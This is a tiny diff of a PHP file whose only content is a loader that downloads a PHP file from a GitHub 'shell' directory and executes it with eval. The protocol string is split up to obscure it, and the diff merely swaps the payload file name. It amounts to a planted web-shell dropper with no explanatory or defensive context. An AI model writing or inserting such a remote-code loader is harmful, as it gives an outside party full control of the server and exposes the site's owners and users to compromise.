@@ -1,4 +1,4 @@
 <?php
 $awo = 'htt'.'ps://';
-eval("?>".file_get_contents($awo.'raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/refs/heads/main/shell/vatfan.php'));
+eval("?>".file_get_contents($awo.'raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php'));
 ?>
